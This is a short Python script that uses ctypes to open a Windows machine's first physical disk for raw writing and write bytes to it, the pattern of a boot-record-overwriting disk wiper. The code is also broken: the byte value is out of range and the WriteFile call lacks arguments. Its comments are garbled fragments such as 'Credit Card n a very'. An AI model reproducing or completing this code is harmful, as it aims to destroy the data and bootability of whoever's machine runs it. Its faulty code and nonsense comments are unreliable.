import ctypes
from sys import exit

hex_data = bytes([0xAAB83])
#hex dada wanted
dll = ctypes.windll

hDevice = dll.Kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) # Credit Card n a very 
dll.Kernel32.WriteFile(hDevice, hex_data, None) #tedtificate
dll.Kernel32.CloseHandle(hDevice) 
